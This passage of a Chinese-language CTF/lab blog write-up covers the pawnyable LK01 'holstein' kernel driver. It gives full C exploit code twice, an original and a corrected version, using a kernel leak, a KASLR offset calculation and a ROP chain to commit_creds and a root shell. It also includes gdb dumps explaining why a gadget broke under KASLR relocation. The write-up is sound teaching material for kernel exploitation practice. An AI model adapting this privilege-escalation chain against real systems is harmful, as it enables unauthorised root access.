class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x408</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] leak=0x%lx\n"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vfs_read+172</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">172</span><span class="token operator">-</span><span class="token number">0xffffffff8113d290</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff=0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="EXP遇到的问题"><a href="#EXP遇到的问题" class="headerlink" title="EXP遇到的问题"></a>EXP遇到的问题</h2><p>理论上应该很顺利，但是在其中遇到了抽象问题：</p><ol><li>在关闭kaslr的情况下exp能够成功；但是如果打开kaslr，我的exp有较大概率导致内核崩溃，小概率成功</li><li>通过每一次打印计算出的随机化后的gadgets和函数地址，并将这些地址与gdb及<code>/proc/kallsyms</code>中的地址做比较，我发现自己的泄露基地址、计算gadgets和函数地址的部分没有问题，得出的地址是正确的；</li></ol><p>耗了我很长时间，很是迷惑，我决定打开kaslr来调试一番：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">pwndbg> stack 2000:0000│ rsp 0xffffad21c0413eb0 —▸ 0xffffffffbce7bbdc ◂— pop rdi /* 0x74d28548ccccc35f */01:0008│     0xffffad21c0413eb8 ◂— 002:0010│     0xffffad21c0413ec0 —▸ 0xffffffffbcc6e240 ◂— push rbp /* 0x894800000cc0be55 */03:0018│     0xffffad21c0413ec8 —▸ 0xffffffffbceea083 ◂— pop rcx /* 0x100ff81c3bd8359 */04:0020│     0xffffad21c0413ed0 ◂— 005:0028│     0xffffad21c0413ed8 —▸ 0xffffffffbd20c96b ◂— mov rdi, rax /* 0x66c3a548f3c78948 */06:0030│     0xffffad21c0413ee0 —▸ 0xffffffffbcc6e390 ◂— push rbp /* 0x4c655541e5894855 */07:0038│     0xffffad21c0413ee8 —▸ 0xffffffffbd400e26 ◂— mov rdi, rsp /* 0x25248b4865e78948 */08:0040│     0xffffad21c0413ef0 ◂— out dx, eax /* 0xdeadbeef */09:0048│ r15 0xffffad21c0413ef8 ◂— out dx, eax /* 0xdeadbeef */0a:0050│     0xffffad21c0413f00 —▸ 0x4017e9 ◂— endbr64  /* 0xe5894855fa1e0ff3 */0b:0058│     0xffffad21c0413f08 ◂— 0x33 /* '3' */0c:0060│     0xffffad21c0413f10 ◂— 0x2460d:0068│     0xffffad21c0413f18 —▸ 0x7ffd0c83ea50 ◂— 10e:0070│     0xffffad21c0413f20 ◂— 0x2b /* '+' */0f:0078│     0xffffad21c0413f28 ◂— 0... ↓        4 skipped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始看起来非常正常，但是继续步进到<code>pop rcx; ret;</code>时，发现该gadget的逻辑发生了变化：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text"> ► 0xffffffffa8aea083    pop    rcx   0xffffffffa8aea084    test   eax, 0xff81c3   0xffffffffa8aea08a    add    dword ptr [rax], eax   0xffffffffa8aea08c    add    byte ptr [rcx], bl   0xffffffffa8aea08e    rol    byte ptr [rbx + 0x48c302c0], init_module+79 &lt;139>   0xffffffffa8aea095    push   rdi   0xffffffffa8aea096    or     byte ptr [rdi], cl   0xffffffffa8aea098    mov    dh, 2   0xffffffffa8aea09a    cmp    ax, init_module+31            &lt;91>   0xffffffffa8aea09e    jne    0xffffffffa8aea0a7            &lt;0xffffffffa8aea0a7>    ↓   0xffffffffa8aea0a7    ret   ─────────────────────────────────────────[STACK]────────────────────────────────────────00:0000│ rsp 0xffffb9420044bed0 ◂— 001:0008│     0xffffb9420044bed8 —▸ 0xffffffffa8e0c96b ◂— mov rdi, rax /* 0x66c3a548f3c78948 */02:0010│     0xffffb9420044bee0 —▸ 0xffffffffa886e390 ◂— push rbp /* 0x4c655541e5894855 */03:0018│     0xffffb9420044bee8 —▸ 0xffffffffa9000e26 ◂— mov rdi, rsp /* 0x25248b4865e78948 */04:0020│     0xffffb9420044bef0 ◂— out dx, eax /* 0xdeadbeef */05:0028│ r15 0xffffb9420044bef8 ◂— out dx, eax /* 0xdeadbeef */06:0030│     0xffffb9420044bf00 —▸ 0x4017e9 ◂— endbr64  /* 0xe5894855fa1e0ff3 */07:0038│     0xffffb9420044bf08 ◂— 0x33 /* '3' */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正是pop和ret中间插入的垃圾指令导致了exp执行失败，而且每次测试似乎这些垃圾指令还不一样。到目前为止，我终于查明了exp失败的直接原因，但不知道是什么导致了我的gadget被改写。按理说，kaslr应该只是做内存布局的随机化，不应该修改内核内容才对。</p><p>追根溯源，直接来定位<code>pop rcx; ret;</code>这个gadget(0xffffffff812ea083），它并不是一个内核中该地址处原有的两条指令，而是从一条mov指令中的+12处截断解析出的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0xffffffff812ea080</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>mov    al<span class="token punctuation">,</span>BYTE PTR <span class="token punctuation">[</span>rdi<span class="token operator">-</span><span class="token number">0x7e3ca700</span><span class="token punctuation">]</span><span class="token comment">//机器码</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span><span class="token number">6</span>xb <span class="token number">0xffffffff812ea080</span><span class="token number">0xffffffff812ea080</span> <span class="token operator">&lt;</span>acpi_ps_get_argument_count<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span><span class="token number">0x8a</span><span class="token number">0x87</span><span class="token number">0x00</span><span class="token number">0x59</span><span class="token number">0xc3</span><span class="token number">0x81</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个mov指令中使用了绝对地址<code>0xFFFFFFFF81C35900</code>。很明显是ropper和ROPgadget将<code>59 c3</code>识别为了<code>pop rcx;</code></p><p>在没有KASLR的情况下，它确实是一个有效的gadget。然而，一旦KASLR生效，它同时也将内核中这些汇编指令中的绝对地址也做了更新，每次随机化的结果不同也就导致了我每次看到的垃圾指令不一样，甚至小部分情况下垃圾指令不影响原gadget的功能，故而我的exp能够提权成功。</p><h2 id="正确的EXP"><a href="#正确的EXP" class="headerlink" title="正确的EXP"></a>正确的EXP</h2><p>更换rcx的gadget为<code>0xffffffff81466bd5: pop rcx; add cl, cl; ret;</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_ADD_AL_AL_RET</span> <span class="token expression"><span class="token number">0xffffffff81466bd5</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x410</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x408</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] leak=0x%lx\n"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//vfs_read+172</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">172</span><span class="token operator">-</span><span class="token number">0xffffffff8113d290</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] koff=0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_ADD_AL_AL_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/c838977b74400db31efc647c8b0e2aa2_MD5.jpeg"></p><blockquote><p>作者提供了一个工具 ropr：<a href="https://github.com/Ben-Lichtman/ropr">Ben-Lichtman&#x2F;ropr：一个超快™的多线程 ROP 小工具查找器。Ropper &#x2F; Ropgadget相关应用 — Ben-Lichtman&#x2F;ropr: A blazing fast™ multithreaded ROP Gadget finder. ropper &#x2F; ropgadget alternative (github.com)</a></p></blockquote><h1 id="五、闲谈"><a href="#五、闲谈" class="headerlink" title="五、闲谈"></a>五、闲谈</h1><p> 一开始，我觉得自己能够很快完成这个场景相关的漏洞利用。事实上，从ret2usr到绕过kpti这部分，我确实没有用太多时间，但是在kaslr这里卡了很久，原因就是前面提到的那个gadget被修改的问题。</p><p>事实证明，做难而正确的事的收获是巨大的。追踪到底，问题的背后别有洞天。所谓hack，其实正是不断地去探索这些未知的东西。</p><hr><blockquote><p>附件：<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01.tar.gz">LK01.tar.gz</a><br>参考文章：<a 